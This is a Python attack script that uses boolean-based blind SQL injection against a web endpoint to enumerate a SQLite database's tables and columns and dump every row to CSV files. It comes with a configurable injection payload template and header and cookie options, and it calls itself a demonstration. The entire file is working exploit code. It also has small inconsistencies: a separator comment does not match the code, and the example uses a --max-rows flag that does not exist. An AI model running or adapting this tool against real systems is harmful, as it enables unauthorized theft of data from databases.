#!/usr/bin/env python3
"""Demonstrate SQLite schema and data extraction through boolean-based SQLi."""

import argparse
import csv
import re
import sys
from argparse import Namespace
from pathlib import Path

from boolean_extractor import extract_string

# The extractor intentionally handles printable ASCII (32-126), so delimiters
# must also be printable. They should not occur in the schema names used here.
ROW_SEPARATOR = "~"
COLUMN_SEPARATOR = "|"


def quote_identifier(identifier):
    """Quote a SQLite identifier without allowing it to alter the query."""
    return '"' + identifier.replace('"', '""') + '"'


def table_filename(table):
    """Keep database-derived names inside the output directory."""
    safe_name = re.sub(r"[^A-Za-z0-9_.-]", "_", table)
    return f"{safe_name or 'table'}.csv"


def extractor_args(args, query):
    return Namespace(
        url=args.url,
        method=args.method,
        data=args.data,
        payload=args.payload,
        query=query,
        true_string=args.true_string,
        false_string=args.false_string,
        true_status=args.true_status,
        headers=args.headers,
        cookies=args.cookies,
        timeout=args.timeout,
    )


def extract(args, query):
    """Run one query through the existing boolean extractor."""
    return extract_string(query, extractor_args(args, query))


def split_result(value, separator):
    return [item for item in value.split(separator) if item]


def enumerate_tables(args):
    query = (
        f"SELECT group_concat(name, '{ROW_SEPARATOR}') "
        "FROM sqlite_master "
        "WHERE type='table' AND name NOT LIKE 'sqlite_%' "
        "ORDER BY name"
    )
    return split_result(extract(args, query), ROW_SEPARATOR)


def enumerate_columns(args, table):
    table_literal = table.replace("'", "''")
    query = (
        f"SELECT group_concat(name, '{ROW_SEPARATOR}') "
        f"FROM pragma_table_info('{table_literal}') "
        "ORDER BY cid"
    )
    return split_result(extract(args, query), ROW_SEPARATOR)


def dump_table(args, table, columns):
    # Quote the table and column names because they come from the database
    # schema and must be treated as identifiers rather than SQL expressions.
    quoted_table = quote_identifier(table)
    quoted_columns = [
        f"COALESCE(CAST({quote_identifier(column)} AS TEXT), 'NULL')"
        for column in columns
    ]

    # Combine all column values into one printable string so the boolean
    # extractor can retrieve a complete row in a single query.
    # COALESCE(CAST("id" AS TEXT), 'NULL')
    # || '^' ||
    # || '^' || ...
    # COALESCE(CAST("name" AS TEXT), 'NULL')
    row_expression = f" || '{COLUMN_SEPARATOR}' || ".join(quoted_columns)
    rows = []

    count_query = f"SELECT COUNT(*) FROM {quoted_table}"
    row_count = int(extract(args, count_query) or 0)

    for current_row in range(row_count):
        # use offset to retrieve the n-th row
        query = (
            f"SELECT {row_expression} FROM {quoted_table} LIMIT 1 OFFSET {current_row}"
        )
        # extract row as string and convert it to a python list
        extracted_row = extract(args, query)
        rows.append(extracted_row.split(COLUMN_SEPARATOR))

    return rows


def write_table_csv(table, columns, rows, output_dir):
    """Write one extracted table to a CSV file."""
    output_path = output_dir / table_filename(table)
    with output_path.open("w", newline="", encoding="utf-8") as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(columns)
        writer.writerows(rows)
    return output_path


def build_parser():
    parser = argparse.ArgumentParser(
        description="Dump SQLite tables through a boolean-based SQLi injection.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  python db_dumper.py \\
      -u "http://localhost:8080/restaurant/*" \\
      --payload "1 AND ({cond}) --" \\
      --max-rows 100
        """,
    )
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="Target URL; use * as the GET injection marker.",
    )
    parser.add_argument(
        "-m",
        "--method",
        default="GET",
        choices=["GET", "POST"],
        help="HTTP method (default: GET).",
    )
    parser.add_argument(
        "-d",
        "--data",
        help="POST body containing {payload} where the injection goes.",
    )
    parser.add_argument(
        "--payload",
        default="1 AND ({cond}) --",
        help="Boolean injection template containing {cond}.",
    )
    parser.add_argument("--true-string")
    parser.add_argument("--false-string")
    parser.add_argument(
        "--true-status",
        type=int,
        default=200,
        help="HTTP status that represents true (default: 200).",
    )
    parser.add_argument("--headers", nargs="*")
    parser.add_argument("--cookies")
    parser.add_argument("--timeout", type=float, default=15)
    return parser


def main():
    args = build_parser().parse_args()
    if "{cond}" not in args.payload:
        print("[!] Payload must contain the {cond} placeholder", file=sys.stderr)
        return 2
    if not (args.true_string or args.true_status or args.false_string):
        print(
            "[!] Boolean extraction requires --true-string, --true-status "
            "or --false-string",
            file=sys.stderr,
        )
        return 2
    print("[*] Enumerating tables...")
    tables = enumerate_tables(args)
    output_dir = Path.cwd() / "dump"
    output_dir.mkdir(exist_ok=True)

    if not tables:
        print("[!] No user tables found.")
        print(f"[+] Empty dump directory created at: {output_dir}")
        return 0

    for table in tables:
        print(f"\n[*] Table: {table}")
        columns = enumerate_columns(args, table)
        print(f"[+] Columns: {', '.join(columns)}")
        if not columns:
            continue

        rows = dump_table(args, table, columns)
        output_path = write_table_csv(table, columns, rows, output_dir)
        print(f"[+] Rows extracted: {len(rows)}")
        print(f"[+] CSV written to: {output_path}")

    print(f"\n[+] Database dump written to: {output_dir}")

    return 0


if __name__ == "__main__":
    sys.path.insert(0, str(Path(__file__).parent))
    raise SystemExit(main())
